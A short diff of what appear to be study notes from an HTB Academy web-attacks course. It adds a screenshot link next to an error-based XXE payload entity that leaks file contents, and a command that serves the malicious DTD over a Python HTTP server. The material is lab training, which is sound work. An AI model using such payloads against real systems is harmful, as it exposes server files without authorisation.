@@ -106,6 +106,8 @@ sudo nano xxe.dtd
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
 
+## (web_attacks_xxe_exfil_error_2.jpg)[https://github.com/mithu9554/HTB_Academy/blob/main/HTB_Web_Attacks/web_attacks_xxe_exfil_error_2.jpg]
+
 ```bash
 python3 -m http.server 8000
 ```
